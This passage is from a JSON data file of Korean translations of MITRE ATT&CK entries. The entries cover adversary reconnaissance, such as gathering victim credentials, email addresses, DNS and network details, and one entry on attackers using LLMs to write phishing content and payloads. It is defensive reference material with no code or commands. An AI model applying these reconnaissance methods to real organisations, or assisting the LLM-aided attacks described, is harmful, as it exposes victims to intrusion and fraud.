      "description": "적대자는 목표 설정 중 다양한 기술을 지원하기 위해 대규모 언어 모델(LLM)과 같은 생성적 인공지능 도구에 접근할 수 있습니다. 이러한 도구는 [정보 수집](https://attack.mitre.org/tactics/TA0043), 기본 스크립트 작성, 소셜 엔지니어링 지원, 심지어 페이로드 개발을 포함한 다양한 악의적인 작업을 준수하고 강화하고 가능하게 하는 데 사용될 수 있습니다. (인용: MSFT-AI)\n\n예를 들어, 공개적으로 사용 가능한 LLM을 활용함으로써 적대자는 본질적으로 특정 작업을 해당 도구에 외주를 주거나 자동화하는 것입니다. AI를 사용하여 적대자는 [피싱](https://attack.mitre.org/techniques/T1566)/[정보를 위한 피싱](https://attack.mitre.org/techniques/T1598) 캠페인에 사용될 수 있는 다양한 언어로 콘텐츠를 작성하고 생성할 수 있습니다. 동일한 공개 도구는 [능력 개발](https://attack.mitre.org/techniques/T1587)을 지원하는 취약점 또는 기타 공격적 연구를 가능하게 할 수 있습니다. AI 도구는 또한 악성 스크립트 및 페이로드를 생성, 세련되게 또는 기타 방식으로 개선(예: [난독화된 파일 또는 정보](https://attack.mitre.org/techniques/T1027))하여 기술 작업을 자동화할 수 있습니다. (인용: OpenAI-CTI)",
      "external_id": "T1588.007",
      "modified": "2024-09-12T19:18:36.583Z",
      "title": "Artificial Intelligence",
      "translated": true
    },
    {
      "description": "공격자는 표적 설정 시 사용할 수 있는 피해자의 신원에 대한 정보를 수집할 수 있습니다. 신원 정보에는 개인 데이터(예: 직원 이름, 이메일 주소, 보안 질문 응답 등) 및 자격 증명이나 다단계 인증(MFA) 구성과 같은 민감한 세부사항이 포함될 수 있습니다.\n\n공격자는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 직접적인 유도 방법을 통해 다양한 방식으로 이 정보를 수집할 수 있습니다. 사용자에 대한 정보는 시스템에서 유효한 사용자 이름이나 해당 사용자 이름과 관련된 허용된 MFA/방법을 드러낼 수 있는 인증 서비스의 응답을 탐색하고 분석하는 등의 다른 활성 수단(즉, [능동 스캔](https://attack.mitre.org/techniques/T1595))을 통해도 열거될 수 있습니다. (참고: GrimBlog UsernameEnum)(참고: Obsidian SSPR Abuse 2023) 피해자에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 공격자에게 노출될 수도 있습니다(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594)). (참고: OPM Leak)(참고: Register Deloitte)(참고: Register Uber)(참고: Detectify Slack Tokens)(참고: Forbes GitHub Creds)(참고: GitHub truffleHog)(참고: GitHub Gitrob)(참고: CNET Leaks)\n\n이 정보를 수집함으로써 다른 형태의 정찰 기회를 드러낼 수 있습니다(예: [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)), 운영 리소스를 설정할 수 있습니다(예: [계정 타협](https://attack.mitre.org/techniques/T1586)), 및/또는 초기 접근을 할 수 있습니다(예: [피싱](https://attack.mitre.org/techniques/T1566) 또는 [유효한 계정](https://attack.mitre.org/techniques/T1078)).",
      "external_id": "T1589",
      "modified": "2024-09-16T16:09:45.794Z",
      "title": "Gather Victim Identity Information",
      "translated": true
    },
    {
      "description": "적대자는 목표 대상에 대한 타겟팅을 수행하는 데 사용될 수 있는 자격 증명을 수집할 수 있습니다. 적대자가 수집한 계정 자격 증명은 피해자 조직과 직접적으로 연관된 것일 수도 있고, 사용자가 개인 계정과 비즈니스 계정에 같은 비밀번호를 사용하는 경향을 이용하려고 할 수도 있습니다.\n\n적대자는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 여러 방법을 통해 잠재적 피해자로부터 자격 증명을 수집할 수 있습니다. 적대자는 또한 웹사이트를 해킹한 후 방문자의 웹사이트 인증 쿠키를 수집하도록 설계된 악성 콘텐츠를 추가할 수 있습니다. (인용: ATT ScanBox) (인용: Register Deloitte) (인용: Register Uber) (인용: Detectify Slack Tokens) (인용: Forbes GitHub Creds) (인용: GitHub truffleHog) (인용: GitHub Gitrob) (인용: CNET Leaks) 다단계 인증(MFA)이 외부 통신 기반으로 이루어지는 경우, 적대자는 서비스 공급자를 해킹하여 MFA 코드와 일회용 비밀번호(OTP)에 접근할 수 있습니다. (인용: Okta Scatter Swine 2022)\n\n자격 증명 정보는 또한 온라인 또는 기타 접근 가능한 데이터 세트(예: [검색 엔진](https://attack.mitre.org/techniques/T1593/002), 유출 데이터, 코드 저장소 등)를 통해 적대자에게 노출될 수 있습니다. 적대자는 러시아 시장이나 2easy와 같은 다크 웹 시장에서 자격 증명을 구매하거나 정보 탈취 악성코드의 로그를 배포하는 텔레그램 채널에 접근하여 자격 증명을 얻을 수 있습니다. (인용: Bleeping Computer 2easy 2021) (인용: SecureWorks Infostealers 2023) (인용: Bleeping Computer Stealer Logs 2023)\n\n이 정보를 수집함으로써, 다른 형태의 정찰(예: [공식 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598))에서 기회를 찾거나, 운영 리소스를 구축(예: [계정 해킹](https://attack.mitre.org/techniques/T1586)), 또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 또는 [유효한 계정](https://attack.mitre.org/techniques/T1078))을 확보할 수 있습니다.",
      "external_id": "T1589.001",
      "modified": "2024-10-10T13:45:01.069Z",
      "title": "Credentials",
      "translated": true
    },
    {
      "description": "상대방은 표적 및 공격에 사용할 수 있는 이메일 주소를 수집할 수 있습니다. 내부 시스템이 존재하더라도 조직에서는 직원들을 위한 외부 이메일 인프라 및 주소를 가지고 있을 수 있습니다.\n\n상대방은 이메일 주소를 쉽게 수집할 수 있으며, 이는 온라인 또는 기타 접근 가능한 데이터 세트(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))를 통해 쉽게 노출될 수 있습니다. (출처: HackersArise Email)(출처: CNET Leaks) 이메일 주소는 더 적극적인 방법(즉, [능동 스캐닝](https://attack.mitre.org/techniques/T1595))을 통해 목록화될 수도 있습니다. 예를 들어, 인증 서비스의 응답을 조 probing하여 시스템에서 유효한 사용자 이름을 노출할 수 있습니다.(출처: GrimBlog UsernameEnum) 예를 들어, 상대방은 다양한 공개 API 엔드포인트(예: autodiscover 및 GetCredentialType)를 쿼리하여 Office 365 환경의 이메일 주소를 나열할 수 있습니다.(출처: GitHub Office 365 User Enumeration)(출처: Azure Active Directory Reconnaisance)\n\n이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있습니다(예: [개방 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)), 운영 리소스를 설정하는 것(예: [이메일 계정](https://attack.mitre.org/techniques/T1586/002)), 및/또는 초기 액세스를 확보하는 것(예: [피싱](https://attack.mitre.org/techniques/T1566) 또는 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110) 통해 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133) 활용)이 가능합니다.",
      "external_id": "T1589.002",
      "modified": "2022-10-21T14:30:10.979Z",
      "title": "Email Addresses",
      "translated": true
    },
    {
      "description": "위험 요소는 목표 설정에 사용될 수 있는 직원의 이름을 수집할 수 있습니다. 직원의 이름은 이메일 주소를 유도하는 데 사용되거나 다른 정찰 활동을 안내하고/하거나 더 그럴듯한 유인을 만들기 위해 활용될 수 있습니다.\n\n위험 요소는 직원의 이름을 쉽게 수집할 수 있습니다. 이는 온라인 또는 기타 접근 가능한 데이터 세트(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))를 통해 쉽게 이용 가능하고 노출될 수 있습니다. (인용: OPM 유출) 이 정보를 수집함으로써 다른 형태의 정찰(예: [개방된 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598))을 위한 기회를 발견하고, 운영 자원을 구축(예: [계정 손상](https://attack.mitre.org/techniques/T1586)), 또는 초기 접근(예: [피싱](https://attack.mitre.org/techniques/T1566) 또는 [유효한 계정](https://attack.mitre.org/techniques/T1078))을 시도할 수 있습니다.",
      "external_id": "T1589.003",
      "modified": "2024-09-16T16:09:45.795Z",
      "title": "Employee Names",
      "translated": true
    },
    {
      "description": "대적자는 표적 설정에 사용될 수 있는 피해자의 네트워크에 대한 정보를 수집할 수 있습니다. 네트워크에 대한 정보는 관리 데이터(예: IP 범위, 도메인 이름 등)와 해당 네트워크의 토폴로지 및 운영에 관한 구체적인 세부정보를 포함할 수 있습니다.\n\n대적자는 [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 직접 수집 행동을 통해 이 정보를 다양한 방법으로 수집할 수 있습니다. 네트워크에 대한 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해 대적자에게 노출될 수 있습니다(예: [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)). (참조: WHOIS)(참조: DNS 덤프스터)(참조: Circl 패시브 DNS) 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며(예: [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 리소스를 구축하거나(예: [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)), 및 초기 접근을 확보하는 데(예: [신뢰된 관계](https://attack.mitre.org/techniques/T1199)) 도움이 될 수 있습니다.",
      "external_id": "T1590",
      "modified": "2021-04-15T03:34:23.229Z",
      "title": "Gather Victim Network Information",
      "translated": true
    },
    {
      "description": "적대자는 표적 설정에 활용할 수 있는 피해자의 네트워크 도메인에 대한 정보를 수집할 수 있습니다. 도메인과 그 속성에 대한 정보는 피해자가 소유한 도메인뿐만 아니라 행정 데이터(예: 이름, 등록기관 등) 및 연락처(이메일 주소 및 전화번호), 비즈니스 주소, 네임 서버와 같은 더 직접적인 실행 가능한 정보와 함께 다양한 세부 정보를 포함할 수 있습니다.\n\n적대자는 [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 다양한 방법으로 이 정보를 수집할 수 있습니다. 피해자 도메인 및 그 속성에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다(예: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(인용: WHOIS)(인용: DNS 덤프스터)(인용: Circl 수동 DNS) 타사 클라우드 제공업체가 사용되는 경우, 정보는 Office 365 환경의 GetUserRealm 및 autodiscover와 같은 공용 API 엔드포인트를 통해 노출될 수도 있습니다.(인용: Azure Active Directory 정찰)(인용: Office 365 Azure 도메인 가용성) 이 정보를 수집하는 것은 다른 형태의 정찰 기회(예: [개방형 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596), [개방형 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593), 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)), 운영 자원 수립(예: [인프라 확보](https://attack.mitre.org/techniques/T1583) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)), 및/또는 초기 접근(예: [피싱](https://attack.mitre.org/techniques/T1566))을 드러낼 수 있습니다.",
      "external_id": "T1590.001",
      "modified": "2022-10-21T14:32:05.257Z",
      "title": "Domain Properties",
      "translated": true
    },
    {
      "description": "적대 세력은 목표 설정 과정에서 사용할 수 있는 피해자의 DNS에 대한 정보를 수집할 수 있습니다. DNS 정보에는 등록된 네임서버를 포함한 다양한 세부 사항과 대상의 서브도메인, 메일 서버 및 기타 호스트의 주소 체계를 설명하는 레코드가 포함될 수 있습니다. DNS의 MX, TXT 및 SPF 레코드는 Office 365, G Suite, Salesforce 또는 Zendesk와 같은 제3자 클라우드 및 SaaS 제공업체의 사용을 드러낼 수도 있습니다.(인용: Sean Metcalf Twitter DNS Records)\n\n적대 세력은 [DNS/수동 DNS](https://attack.mitre.org/techniques/T1596/001)를 통해 쿼리하거나 기타 방법으로 세부 정보를 수집하는 등 다양한 방법으로 이 정보를 수집할 수 있습니다. DNS 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해 적대 세력에게 노출될 수도 있습니다(예: [공식 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)).(인용: DNS Dumpster)(인용: Circl Passive DNS) 이 정보를 수집하는 과정은 다른 형태의 정찰 기회를 드러낼 수 있으며(예: [공식 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596), [공식 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593), 또는 [능동 스캔](https://attack.mitre.org/techniques/T1595)), 운영 리소스를 설정하는 것(예: [인프라 취득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 타락](https://attack.mitre.org/techniques/T1584)), 및/또는 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133))과 관련이 있을 수 있습니다.\n\n적대 세력은 또한 DNS 존 전송(DNS 쿼리 유형 AXFR)을 사용하여 잘못 구성된 DNS 서버에서 모든 레코드를 수집할 수 있습니다.(인용: Trails-DNS)(인용: DNS-CISA)(인용: Alexa-dns)",
      "external_id": "T1590.002",
      "modified": "2024-11-11T16:13:02.196Z",
      "title": "DNS",
      "translated": true
    },
    {
      "description": "위협 행위자는 타겟팅 과정에서 사용할 수 있는 피해자의 네트워크 신뢰 의존성에 대한 정보를 수집할 수 있습니다. 네트워크 신뢰에 대한 정보는 관리 서비스 제공업체, 계약자 등과 같은 제2자 또는 제3자 조직/도메인과의 연결(및 잠재적으로 상승된) 네트워크 액세스를 포함하여 여러 세부정보를 포함할 수 있습니다.\n\n위협 행위자는 [정보 피싱](https://attack.mitre.org/techniques/T1598)을 통한 직접적인 유도를 포함하여 다양한 방법으로 이 정보를 수집할 수 있습니다. 네트워크 신뢰에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트(예: [열린 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596))를 통해서도 위협 행위자에게 노출될 수 있습니다. 이 정보를 수집하면 다른 형태의 정찰 기회를 밝혀낼 수 있으며(예: [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [열린 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원을 설정할 수 있습니다(예: [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)), 그리고/또는 초기 액세스(예: [신뢰 관계](https://attack.mitre.org/techniques/T1199))를 구축할 수 있습니다.",
      "external_id": "T1590.003",
      "modified": "2021-04-15T03:34:22.917Z",
      "title": "Network Trust Dependencies",
      "translated": true
    },
    {
      "description": "공격자는 목표 선정 과정에서 피해자의 네트워크 토폴로지에 대한 정보를 수집할 수 있습니다. 네트워크 토폴로지에 대한 정보는 외부 및 내부 네트워크 환경의 물리적 및/또는 논리적 배열을 포함하여 다양한 세부 정보를 포함할 수 있습니다. 이 정보는 네트워크 장치(게이트웨이, 라우터 등) 및 기타 인프라에 대한 세부 정보를 포함할 수도 있습니다.\n\n공격자는 [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 직접적인 수집 방법을 통해 이 정보를 수집할 수 있습니다. 네트워크 토폴로지에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트(예: [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))를 통해 공격자에게 노출될 수도 있습니다. 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며(예: [공개 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596) 또는 [공식 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원의 확보(예: [인프라 확보](https://attack.mitre.org/techniques/T1583) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)) 및/혹은 초기 접근(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133))을 가능하게 할 수 있습니다.",
      "external_id": "T1590.004",
      "modified": "2021-04-15T03:33:02.476Z",
      "title": "Network Topology",
      "translated": true
    },
    {
      "description": "공격자는 타겟으로 삼기 위해 피해자의 IP 주소를 수집할 수 있습니다. 공개 IP 주소는 조직에 블록 단위로 할당되거나 연속적인 범위로 나눠져 있을 수 있습니다. 할당된 IP 주소에 대한 정보는 사용 중인 IP 주소 등 다양한 세부 사항을 포함할 수 있습니다. IP 주소는 공격자가 피해자에 대한 다른 세부 정보를 유도하는 데에도 사용될 수 있습니다. 예를 들어, 조직의 규모, 물리적 위치, 인터넷 서비스 제공업체 및 공개적으로 노출된 인프라가 호스팅되는 위치/방법 등이 있습니다.\n\n공격자는 [능동 스캔](https://attack.mitre.org/techniques/T1595)이나 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 다양한 방법을 통해 이 정보를 수집할 수 있습니다. 할당된 IP 주소에 대한 정보는 온라인이나 다른 접근 가능한 데이터 세트를 통해 공격자에게 노출될 수도 있습니다(예: [오픈 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)). (인용: WHOIS)(인용: DNS 덤퍼)(인용: Circl 수동 DNS) 이 정보를 수집하는 것은 다른 형태의 정찰을 위한 기회를 드러낼 수 있으며(예: [능동 스캔](https://attack.mitre.org/techniques/T1595) 또는 [오픈 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원을 설정하는 데 도움을 줄 수 있습니다(예: [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 [인프라 손상](https://attack.mitre.org/techniques/T1584)), 그리고/또는 초기 접근을 위한 방법이 될 수 있습니다(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)).",
      "external_id": "T1590.005",
      "modified": "2021-04-15T03:31:05.302Z",
      "title": "IP Addresses",
      "translated": true
    },
    {
      "description": "공격자는 대상 네트워크의 보안 장치에 대한 정보를 수집할 수 있으며, 이 정보를 타겟팅하는 데 활용할 수 있습니다. 네트워크 보안 장치에 대한 정보에는 배포된 방화벽, 콘텐츠 필터, 프록시/배스천 호스트의 존재 및 세부사항과 같은 다양한 내용이 포함될 수 있습니다. 공격자는 피해자의 네트워크 기반 침입 탐지 시스템(NIDS) 또는 방어 사이버 보안 작업과 관련된 기타 장치에 대한 정보도 겨냥할 수 있습니다.\n\n공격자는 이러한 정보를 여러 가지 방법으로 수집할 수 있으며, 예를 들어 [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [정보 낚시](https://attack.mitre.org/techniques/T1598)와 같은 직접적인 수집 작업을 통해 가능합니다. 또한 네트워크 보안 장치에 대한 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해 공격자에게 노출될 수 있습니다(예: [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594)). 이 정보를 수집하는 것은 다른 형태의 정찰을 위한 기회를 드러낼 수 있습니다(예: [오픈 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596) 또는 [오픈 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 리소스 구축(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 획득](https://attack.mitre.org/techniques/T1588)), 및/또는 초기 액세스(예: [외부 원격 서비스](https://attack.mitre.org/techniques/T1133))를 위한 수단이 될 수 있습니다.",
      "external_id": "T1590.006",
      "modified": "2021-04-15T03:31:54.275Z",
      "title": "Network Security Appliances",
      "translated": true
    },
    {
      "description": "공격자는 목표 설정에 사용할 수 있는 피해자의 조직에 대한 정보를 수집할 수 있습니다. 조직에 대한 정보에는 부서/부문의 이름, 사업 운영의 세부사항, 주요 직원의 역할 및 책임을 포함한 다양한 세부정보가 포함될 수 있습니다.\n\n공격자는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 직접적인 유도를 통해 이 정보를 수집할 수 있습니다. 조직에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 공격자에게 노출될 수도 있습니다(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594)).(출처: ThreatPost Broadvoice Leak)(출처: SEC EDGAR Search) 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있습니다(예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원을 구축하는 것(예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 손상](https://attack.mitre.org/techniques/T1586)), 그리고/또는 초기 접근(예: [피싱](https://attack.mitre.org/techniques/T1566) 또는 [신뢰 관계](https://attack.mitre.org/techniques/T1199)).",
      "external_id": "T1591",
      "modified": "2021-08-27T15:37:09.343Z",
      "title": "Gather Victim Org Information",
      "translated": true
    },
    {
      "description": "위협 행위자는 타겟팅 시 사용할 수 있는 피해자의 물리적 위치(들)를 수집할 수 있습니다. 타겟 조직의 물리적 위치에 대한 정보는 중요한 자원과 인프라가 위치한 곳을 포함한 다양한 세부정보를 포함할 수 있습니다. 물리적 위치는 또한 피해자가 운영하는 법적 관할권 및/또는 당국을 나타낼 수 있습니다.\n\n위협 행위자는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 직접적인 방법을 통해 이러한 정보를 수집할 수 있습니다. 타겟 조직의 물리적 위치는 또한 온라인 또는 기타 접근 가능한 데이터 세트를 통해 위협 행위자에게 노출될 수 있습니다 (예: [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594) 또는 [소셜 미디어](https://attack.mitre.org/techniques/T1593/001)).(출처: ThreatPost Broadvoice Leak)(출처: SEC EDGAR Search) 이러한 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있습니다 (예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [오픈 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원 설정 (예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 획득](https://attack.mitre.org/techniques/T1588)), 및/또는 초기 접근 (예: [피싱](https://attack.mitre.org/techniques/T1566) 또는 [하드웨어 추가](https://attack.mitre.org/techniques/T1200)).",
      "external_id": "T1591.001",
      "modified": "2021-08-27T15:37:09.025Z",
      "title": "Determine Physical Locations",
      "translated": true
    },
    {
      "description": "적대자는 목표물의 비즈니스 관계에 대한 정보 수집을 통해 공격 대상 선정에 활용할 수 있습니다. 조직의 비즈니스 관계에 대한 정보는 여러 가지 세부 사항을 포함할 수 있으며, 여기에는 관리 서비스 제공업체, 계약자 등과 같이 연결되었고 잠재적으로 높은 네트워크 접근 권한을 가진 제2자 또는 제3자 조직/도메인이 포함됩니다. 이 정보는 또한 목표 고객의 하드웨어 및 소프트웨어 자원의 공급망 및 배송 경로를 밝혀낼 수 있습니다.\n\n적대자는 이 정보를 다양한 방법으로 수집할 수 있으며, 예를 들어 [정보 피싱](https://attack.mitre.org/techniques/T1598)을 통해 직접적으로 정보를 이끌어낼 수 있습니다. 비즈니스 관계에 대한 정보는 온라인 또는 다른 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있으며 (예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594))이 있습니다. 이러한 정보 수집은 다른 형태의 정찰을 위한 기회를 드러낼 수 있습니다 (예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 리소스를 설정하는 것 (예: [계정 생성](https://attack.mitre.org/techniques/T1585) 또는 [계정 탈취](https://attack.mitre.org/techniques/T1586)), 그리고/또는 초기 접근 (예: [공급망 침해](https://attack.mitre.org/techniques/T1195), [드라이브 바이 침해](https://attack.mitre.org/techniques/T1189), 또는 [신뢰 관계](https://attack.mitre.org/techniques/T1199))을 위한 수단이 될 수 있습니다.",
      "external_id": "T1591.002",
      "modified": "2021-04-15T03:36:58.964Z",
      "title": "Business Relationships",
      "translated": true
    },
    {
      "description": "대적자는 피해자의 비즈니스 템포에 대한 정보를 수집하여 타겟팅에 활용할 수 있습니다. 조직의 비즈니스 템포에 대한 정보는 운영 시간 또는 주중의 특정 요일을 포함한 다양한 세부 사항을 포함할 수 있습니다. 이 정보는 또한 피해자의 하드웨어 및 소프트웨어 자원의 구매 및 배송 시점/날짜를 드러낼 수 있습니다.\n\n대적자는 [정보를 얻기 위한 피싱(Phishing for Information)](https://attack.mitre.org/techniques/T1598)과 같은 직접적인 방식으로 이 정보를 수집할 수 있습니다. 비즈니스 템포에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 대적자에게 노출될 수 있습니다 (예: [소셜 미디어(Social Media)](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색(Search Victim-Owned Websites)](https://attack.mitre.org/techniques/T1594)).(출처: ThreatPost Broadvoice Leak) 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있습니다 (예: [정보를 얻기 위한 피싱(Phishing for Information)](https://attack.mitre.org/techniques/T1598) 또는 [개방 웹사이트/도메인 검색(Search Open Websites/Domains)](https://attack.mitre.org/techniques/T1593)), 운영 자원 설정 (예: [계정 설정(Establish Accounts)](https://attack.mitre.org/techniques/T1585) 또는 [계정 침해(Compromise Accounts)](https://attack.mitre.org/techniques/T1586)), 및/또는 초기 접근(예: [공급망 침해(Supply Chain Compromise)](https://attack.mitre.org/techniques/T1195) 또는 [신뢰 관계(Trusted Relationship)](https://attack.mitre.org/techniques/T1199))을 가능하게 할 수 있습니다.",
      "external_id": "T1591.003",
      "modified": "2021-04-15T03:38:31.983Z",
      "title": "Identify Business Tempo",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 사용할 수 있는 피해 조직 내의 신원 및 역할에 대한 정보를 수집할 수 있습니다. 비즈니스 역할에 대한 정보는 주요 인력의 식별 가능 정보뿐만 아니라 그들이 접근할 수 있는 데이터/자원에 대한 다양한 타겟 세부 사항을 공개할 수 있습니다.\n\n적대자는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 직접적인 방법을 통해 이러한 정보를 수집할 수 있습니다. 비즈니스 역할에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자가 소유한 웹사이트 검색](https://attack.mitre.org/techniques/T1594)). (출처: ThreatPost Broadvoice Leak) 이러한 정보를 수집함으로써 추가적인 정찰 기회를 드러낼 수 있습니다(예: [정보 피싱](https://attack.mitre.org/techniques/T1598) 또는 [공개 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593)), 운영 자원을 구축할 수 있습니다(예: [계좌 생성](https://attack.mitre.org/techniques/T1585) 또는 [계좌 타겟팅](https://attack.mitre.org/techniques/T1586)), 그리고/또는 초기 접근을 획득할 수 있습니다(예: [피싱](https://attack.mitre.org/techniques/T1566)).",
      "external_id": "T1591.004",
      "modified": "2021-04-15T03:39:08.904Z",
      "title": "Identify Roles",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 사용할 수 있는 피해자의 호스트에 대한 정보를 수집할 수 있습니다. 호스트에 대한 정보에는 관리 데이터(예: 이름, 할당된 IP, 기능 등)와 구성에 대한 세부 정보(예: 운영 체제, 언어 등)가 포함될 수 있습니다.\n\n적대자는 [능동 스캐닝](https://attack.mitre.org/techniques/T1595) 또는 [정보 피싱](https://attack.mitre.org/techniques/T1598)과 같은 다양한 방법으로 이 정보를 수집할 수 있습니다. 또한, 적대자는 사이트를 침해한 후 방문자로부터 호스트 정보를 수집하도록 설계된 악성 콘텐츠를 포함할 수도 있습니다.(인용: ATT ScanBox) 호스트에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해서도 적대자에게 노출될 수 있습니다(예: [소셜 미디어](https://attack.mitre.org/techniques/T1593/001) 또는 [피해자 소유 웹사이트 검색](https://attack.mitre.org/techniques/T1594)). 이 정보를 수집함으로써 다른 형태의 정탐 기회를 발견할 수 있으며(예: [개방 웹사이트/도메인 검색](https://attack.mitre.org/techniques/T1593) 또는 [개방 기술 데이터베이스 검색](https://attack.mitre.org/techniques/T1596)), 운영 자원을 설정할 수 있으며(예: [능력 개발](https://attack.mitre.org/techniques/T1587) 또는 [능력 확보](https://attack.mitre.org/techniques/T1588)), 초기 접근(예: [공급망 손상](https://attack.mitre.org/techniques/T1195) 또는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)) 등을 할 수 있습니다.\n\n또한, 적대자는 사용자 에이전트 HTTP 헤더를 통해 피해자 호스트 정보를 수집할 수 있습니다. 이는 서버에 전송되어 요청하는 사용자 에이전트의 응용 프로그램, 운영 체제, 공급업체 및/또는 버전을 식별하는 데 사용됩니다. 이는 적대자의 후속 작업에 정보를 제공하는 데 사용될 수 있습니다. 예를 들어, 적대자는 요청하는 운영 체제에 대한 사용자 에이전트를 확인한 다음, 타겟 운영 체제에만 악성 코드를 제공하고 나머지는 무시할 수 있습니다.(인용: TrellixQakbot)",
      "external_id": "T1592",
      "modified": "2024-10-03T19:35:07.269Z",
      "title": "Gather Victim Host Information",
      "translated": true
    },
    {
